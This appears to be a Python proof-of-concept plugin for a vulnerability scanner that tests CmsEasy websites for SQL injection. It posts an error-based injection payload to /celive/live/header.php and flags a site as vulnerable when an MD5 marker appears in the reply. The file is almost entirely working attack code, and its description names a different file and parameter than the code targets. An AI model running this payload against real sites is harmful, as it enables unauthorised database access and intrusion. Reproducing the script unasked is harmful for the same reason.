# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class cmsseasy_header_detail_sqli(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'cmseasy',
            'vuln_title':'cmsseasy_header_detail_sqli',
            'vuln_level':1,
            'vuln_type':1,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'文件/coupon/s.php中,参数fids存在SQL注入',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        post_data = {
            "xajax":"Postdata",
            "xajaxargs[0]":"<xjxquery><q>detail=xxxxxx'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1=1,md5(1234)))),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)AND'1'='1</q></xjxquery>",
        }
        payload = "/celive/live/header.php"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers,verify=False)
            #判断headers的Content-Type是否为application/xml
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = cmsseasy_header_detail_sqli("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)